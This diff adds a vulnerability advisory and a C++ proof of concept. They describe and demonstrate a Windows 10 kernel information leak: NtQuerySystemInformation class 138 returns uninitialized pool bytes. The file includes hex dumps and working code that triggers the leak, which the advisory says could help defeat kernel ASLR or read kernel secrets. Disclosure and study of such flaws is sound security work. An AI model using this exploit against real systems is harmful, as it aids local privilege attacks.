@@ -1,0 +1,89 @@
+/*
+We have discovered that the nt!NtQuerySystemInformation system call invoked with the 138 information class discloses portions of uninitialized kernel pool memory to user-mode clients. The specific information class is handled by an internal nt!ExpQueryMemoryTopologyInformation function.
+
+While we don't know the layout of the output structure, we have determined that on our test Windows 10 version 1709 32-bit system, the output size is 0x70 (112) bytes. Within the output buffer, 12 bytes in three 4-byte chunks of consecutive memory are not properly initialized and contain leftover data from the kernel pool. The data originates from a NonPagedPoolNx allocation requested in nt!MmGetNodeChannelRanges, based on a 16+32*N formula where N is returned by nt!MiReferencePageRuns. Each uninitialized 4-byte chunk corresponds to a specific 32-byte structure in the kernel buffer.
+
+The issue can be reproduced by running the attached proof-of-concept program on a system with the Special Pools mechanism enabled for ntoskrnl.exe. Then, it is clearly visible that bytes at the aforementioned offsets are equal to the markers inserted by Special Pools, and would otherwise contain leftover data that was previously stored in that memory region:
+
+--- cut ---
+00000000: 03 00 00 00 00 00 00 00 01 00 00 00 01 00 00 00 ................
+00000010: 00 00 00 00 00 00 00 00 01 00 00 00 00 00 00 00 ................
+00000020: 9e 00 00 00 00 00 00 00 00 00 00 00 5f 5f 5f 5f ............____
+00000030: 00 00 00 00 00 00 00 00 00 01 00 00 00 00 00 00 ................
+00000040: 02 00 00 00 00 00 00 00 00 00 00 00 5f 5f 5f 5f ............____
+00000050: 00 00 00 00 00 00 00 00 03 01 00 00 00 00 00 00 ................
+00000060: ed fe 0d 00 00 00 00 00 00 00 00 00 5f 5f 5f 5f ............____
+--- cut ---
+00000000: 03 00 00 00 00 00 00 00 01 00 00 00 01 00 00 00 ................
+00000010: 00 00 00 00 00 00 00 00 01 00 00 00 00 00 00 00 ................
+00000020: 9e 00 00 00 00 00 00 00 00 00 00 00 7b 7b 7b 7b ............{{{{
+00000030: 00 00 00 00 00 00 00 00 00 01 00 00 00 00 00 00 ................
+00000040: 02 00 00 00 00 00 00 00 00 00 00 00 7b 7b 7b 7b ............{{{{
+00000050: 00 00 00 00 00 00 00 00 03 01 00 00 00 00 00 00 ................
+00000060: ed fe 0d 00 00 00 00 00 00 00 00 00 7b 7b 7b 7b ............{{{{
+--- cut ---
+00000000: 03 00 00 00 00 00 00 00 01 00 00 00 01 00 00 00 ................
+00000010: 00 00 00 00 00 00 00 00 01 00 00 00 00 00 00 00 ................
+00000020: 9e 00 00 00 00 00 00 00 00 00 00 00 45 45 45 45 ............EEEE
+00000030: 00 00 00 00 00 00 00 00 00 01 00 00 00 00 00 00 ................
+00000040: 02 00 00 00 00 00 00 00 00 00 00 00 45 45 45 45 ............EEEE
+00000050: 00 00 00 00 00 00 00 00 03 01 00 00 00 00 00 00 ................
+00000060: ed fe 0d 00 00 00 00 00 00 00 00 00 45 45 45 45 ............EEEE
+--- cut ---
+
+Repeatedly triggering the vulnerability could allow local authenticated attackers to defeat certain exploit mitigations (kernel ASLR) or read other secrets stored in the kernel address space.
+*/
+
+#include <Windows.h>
+#include <winternl.h>
+#include <cstdio>
+
+#define MemoryTopologyInformation ((SYSTEM_INFORMATION_CLASS)138)
+#define STATUS_BUFFER_TOO_SMALL ((NTSTATUS)0xc0000023)
+
+VOID PrintHex(PBYTE Data, ULONG dwBytes) {
+  for (ULONG i = 0; i < dwBytes; i += 16) {
+    printf("%.8x: ", i);
+
+    for (ULONG j = 0; j < 16; j++) {
+      if (i + j < dwBytes) {
+        printf("%.2x ", Data[i + j]);
+      }
+      else {
+        printf("?? ");
+      }
+    }
+
+    for (ULONG j = 0; j < 16; j++) {
+      if (i + j < dwBytes && Data[i + j] >= 0x20 && Data[i + j] <= 0x7e) {
+        printf("%c", Data[i + j]);
+      }
+      else {
+        printf(".");
+      }
+    }
+
+    printf("\n");
+  }
+}
+
+int main() {
+  DWORD ReturnLength = 0;
+  NTSTATUS st = NtQuerySystemInformation(MemoryTopologyInformation, NULL, 0, &ReturnLength);
+  if (!NT_SUCCESS(st) && st != STATUS_BUFFER_TOO_SMALL) {
+    printf("NtQuerySystemInformation#1 failed, %x\n", st);
+    return 1;
+  }
+
+  PVOID Buffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, ReturnLength);
+  st = NtQuerySystemInformation(MemoryTopologyInformation, Buffer, ReturnLength, &ReturnLength);
+  if (!NT_SUCCESS(st)) {
+    printf("NtQuerySystemInformation#2 failed, %x\n", st);
+    return 1;
+  }
+
+  PrintHex((PBYTE)Buffer, ReturnLength);
+  HeapFree(GetProcessHeap(), 0, Buffer);
+
+  return 0;
+}
